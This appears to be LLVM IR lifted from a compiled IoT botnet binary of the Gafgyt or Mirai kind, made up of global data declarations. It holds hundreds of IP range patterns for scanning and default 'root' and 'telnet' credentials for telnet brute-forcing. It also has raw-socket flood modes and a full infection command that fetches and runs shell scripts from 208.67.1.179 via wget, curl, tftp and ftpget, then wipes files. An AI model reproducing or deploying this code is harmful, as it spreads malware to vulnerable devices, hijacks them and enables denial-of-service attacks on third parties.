source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_262ac.7 = global i32 0
@global_var_262bc.8 = global i32* @global_var_262ac.7
@global_var_2684c.15 = global i32 0
@global_var_262b0.18 = global i32 0
@global_var_11d28.22 = constant i32 -509558771
@global_var_26880.25 = global i32 0
@global_var_26884.26 = local_unnamed_addr global i32 0
@global_var_26888.27 = local_unnamed_addr global i32 0
@global_var_264e0.30 = local_unnamed_addr global i32 4095
@global_var_264dc.33 = global i32 362436
@global_var_1b2e8.35 = constant [7 x i8] c"(null)\00"
@global_var_2a880.37 = local_unnamed_addr global i32 0
@global_var_1b2f0.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_1af38.41 = constant [3 x i8] c"sh\00"
@global_var_1b2f8.43 = constant [3 x i8] c"-c\00"
@global_var_1b2fc.46 = constant i32 -1
@global_var_1b6fc.48 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1b70c.50 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_26864.54 = global i32 0
@global_var_1b718.56 = constant [5 x i8] c"PING\00"
@global_var_1b2d8.58 = constant [8 x i8] c"busybox\00"
@global_var_1b2e0.59 = constant i32 36
@global_var_1b2e4.60 = constant i32 35
@global_var_264a0.61 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1b2d8.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1b2e0.59 to i8*), i8* bitcast (i32* @global_var_1b2e4.60 to i8*)]
@global_var_1b2a0.63 = constant [7 x i8] c"nvalid\00"
@global_var_1b2a8.64 = constant [6 x i8] c"ailed\00"
@global_var_1b2b0.65 = constant [9 x i8] c"ncorrect\00"
@global_var_1b2bc.66 = constant [6 x i8] c"enied\00"
@global_var_1b2c4.67 = constant [5 x i8] c"rror\00"
@global_var_1b2cc.68 = constant [7 x i8] c"oodbye\00"
@global_var_1b2d4.69 = constant [4 x i8] c"bad\00"
@global_var_26480.70 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b2a0.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b2a8.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b2b0.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b2bc.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b2c4.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b2cc.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1b2d4.69, i32 0, i32 0)]
@global_var_2686c.72 = global i32 0
@global_var_26870.73 = local_unnamed_addr global i32 0
@global_var_2caec.75 = global i32 0
@global_var_1b720.77 = constant [6 x i8] c":>%$#\00"
@global_var_2687a.79 = global i32 0
@global_var_2687b.80 = local_unnamed_addr global i32 0
@global_var_2687c.81 = local_unnamed_addr global i32 0
@global_var_1b728.85 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1b734.87 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1b744.89 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1b750.91 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1b760.93 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1b76c.95 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1b77c.97 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1b788.99 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1b798.101 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1b7a8.103 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1b7b8.105 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1b7c8.107 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1b7d4.109 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1b7e4.111 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1b7f4.113 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1b804.115 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1b814.117 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1b824.119 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1b834.121 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1b844.123 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1b850.125 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1b85c.127 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1b86c.129 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1b878.131 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1b884.133 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1b890.135 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1b89c.137 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1b8a8.139 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1b8b8.141 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1b8c8.143 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1b8d4.145 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1b8e4.147 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1b8f0.149 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1b8fc.151 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1b908.153 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1b914.155 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1b920.157 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1b92c.159 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1b938.161 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1b948.163 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1b958.165 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1b968.167 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1b978.169 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1b988.171 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1b998.173 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1b9a8.175 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1b9b8.177 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1b9c8.179 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_1b9d8.181 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_1b9e8.183 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_1b9f8.185 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1ba08.187 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1ba18.189 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1ba28.191 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1ba38.193 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1ba48.195 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1ba58.197 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1ba68.199 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1ba78.201 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1ba88.203 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1ba98.205 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1baa8.207 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1bab8.209 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1bac8.211 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1bad8.213 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1bae8.215 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1baf8.217 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1bb08.219 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1bb18.221 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1bb28.223 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1bb38.225 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1bb48.227 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1bb58.229 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1bb68.232 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1bb78.234 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1bb88.236 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1bb98.238 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1bba8.240 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1bbb8.242 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1bbc8.244 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1bbd8.246 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1bbe8.248 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1bbf8.250 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1bc08.252 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1bc18.254 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1bc28.256 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1bc38.258 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1bc48.260 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1bc58.262 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1bc68.264 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1bc78.266 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1bc88.268 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1bc98.270 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1bca8.272 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1bcb8.274 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1bcc8.276 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1bcd8.278 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1bce8.280 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1bcf8.282 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1bd04.284 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1bd14.286 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1bd24.288 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1bd34.290 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1bd40.292 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1bd50.294 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1bd60.296 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1bd70.298 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1bd80.300 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1bd90.302 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1bda0.304 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1bdb0.306 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1bdc0.308 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1bdd0.310 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_1bde0.312 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1bdf0.314 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1be00.316 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1be10.318 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_1be20.320 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_1be30.322 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1be3c.324 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1be4c.326 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_1be5c.328 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_1be6c.330 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_1be7c.332 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_1be8c.334 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_1be9c.336 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_1beac.338 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_1bebc.340 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_1becc.342 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_1bedc.344 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_1beec.346 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_1befc.348 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1bf0c.350 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1bf1c.352 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1bf2c.354 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1bf3c.356 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1bf4c.358 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1bf5c.360 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1bf6c.362 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1bf7c.364 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1bf8c.366 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1bf9c.368 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_1bfac.370 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1bfbc.372 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_1bfcc.374 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_1bfdc.377 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_1bfec.379 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1bffc.381 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1c00c.383 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1c01c.385 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_1c02c.387 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1c038.389 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_1c048.391 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_1c058.393 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_1c068.395 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1c078.397 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_1c088.400 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_1c098.402 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_1c0a8.404 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_1c0b8.406 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_1c0c8.408 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_1c0d8.410 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_1c0e8.412 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_1c0f8.414 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_1c108.416 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_1c118.418 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_1c128.420 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_1c138.422 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_1c148.424 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_1c158.426 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_1c168.428 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1c178.430 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1c188.433 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1c198.435 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1c1a8.437 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_1c1b8.439 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_1c1c8.441 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_1c1d8.443 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_1c1e8.445 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1c1f8.447 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1c208.449 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1c218.451 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1c228.453 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1c238.455 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_1c248.457 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_1c258.459 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_1c268.461 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_1c278.463 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_1c288.465 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_1c298.467 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_1c2a8.469 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_1c2b8.471 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_1c2c8.473 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_1c2d8.475 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_1c2e8.477 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_1c2f8.479 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_1c308.481 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_2cae0.485 = global i32 0
@global_var_1b224.487 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1b234.488 = constant [6 x i8] c"/tmp/\00"
@global_var_1b23c.489 = constant [6 x i8] c"/var/\00"
@global_var_1b244.490 = constant [6 x i8] c"/dev/\00"
@global_var_1b24c.491 = constant [10 x i8] c"/var/run/\00"
@global_var_1b258.492 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1b264.493 = constant [6 x i8] c"/mnt/\00"
@global_var_1b26c.494 = constant [7 x i8] c"/boot/\00"
@global_var_1b274.495 = constant [6 x i8] c"/usr/\00"
@global_var_1b27c.496 = constant [6 x i8] c"/opt/\00"
@global_var_26440.497 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1b224.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b234.488, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b23c.489, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b244.490, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1b24c.491, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1b258.492, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b264.493, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b26c.494, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b274.495, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b27c.496, i32 0, i32 0)]
@global_var_2646c = external global i32
@global_var_1b210.504 = constant [5 x i8] c"root\00"
@global_var_1b218.505 = constant [7 x i8] c"telnet\00"
@global_var_1b220.506 = constant i32 0
@global_var_26428.507 = global [6 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b210.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b210.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b218.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b210.504, i32 0, i32 0), i8* bitcast (i32* @global_var_1b220.506 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b218.505, i32 0, i32 0)]
@global_var_1c328.509 = constant [3 x i8] c"\0D\0A\00"
@global_var_26434.511 = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b210.504, i32 0, i32 0), i8* bitcast (i32* @global_var_1b220.506 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b218.505, i32 0, i32 0)]
@global_var_264b0.513 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b2a0.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b2a8.64, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b2b0.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b2bc.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b2c4.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b2cc.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1b2d4.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1b2d8.58, i32 0, i32 0), i8* bitcast (i32* @global_var_1b2e0.59 to i8*), i8* bitcast (i32* @global_var_1b2e4.60 to i8*)]
@global_var_1c32c.516 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1c344.518 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1c34c.520 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1b060.522 = constant [430 x i8] c" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_26424.523 = local_unnamed_addr global [430 x i8]* @global_var_1b060.522
@global_var_1c354.525 = constant [6 x i8] c"arfgG\00"
@global_var_1c35c.526 = constant [9 x i8] c"HBiug655\00"
@global_var_1c368.527 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1c378.528 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1c38c.529 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1c3a0.530 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1c3ac.531 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1c3b8.532 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1c3c4.533 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1c3d0.534 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1c3dc.535 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1c3ec.536 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1c3f8.537 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1c408.538 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1c414.539 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1c424.540 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1c430.541 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1c43c.542 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1c448.543 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1c458.544 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1c468.545 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1c478.546 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1c484.547 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1c494.548 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1c4a4.549 = constant [12 x i8] c"yteytietyue\00"
@global_var_1c4b0.550 = constant [9 x i8] c"qsortEQS\00"
@global_var_1c4bc.551 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1c4cc.552 = constant [4 x i8] c"std\00"
@global_var_1c4d0.553 = constant [4 x i8] c"dts\00"
@global_var_1c4d4.554 = constant [4 x i8] c"lsk\00"
@global_var_1c4d8.555 = constant [4 x i8] c"kek\00"
@global_var_1c4dc.556 = constant [6 x i8] c"smack\00"
@global_var_1c4e4.557 = constant [4 x i8] c"ily\00"
@global_var_1c4e8.558 = constant [4 x i8] c"tyf\00"
@global_var_1c4ec.559 = constant [4 x i8] c"pos\00"
@global_var_1c4f0.560 = constant [6 x i8] c"cunts\00"
@global_var_1c4f8.561 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c354.525, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c35c.526, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c368.527, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1c378.528, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1c38c.529, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c3a0.530, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c3ac.531, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c3b8.532, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c3c4.533, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c3d0.534, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c3dc.535, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c3ec.536, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c3f8.537, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c408.538, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1c414.539, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c424.540, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c430.541, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c43c.542, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c448.543, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c458.544, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c468.545, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c478.546, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c484.547, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c494.548, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c4a4.549, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4b0.550, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1c4bc.551, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4cc.552, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4d0.553, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4d4.554, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4d8.555, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c4dc.556, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4e4.557, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4e8.558, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c4ec.559, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c4f0.560, i32 0, i32 0)]
@global_var_1c588.564 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1c5a4.566 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1c5c8.571 = constant [4 x i8] c"all\00"
@global_var_1c5cc.573 = constant i32 44
@global_var_1c5d0.575 = constant [4 x i8] c"syn\00"
@global_var_1c5d4.577 = constant [4 x i8] c"rst\00"
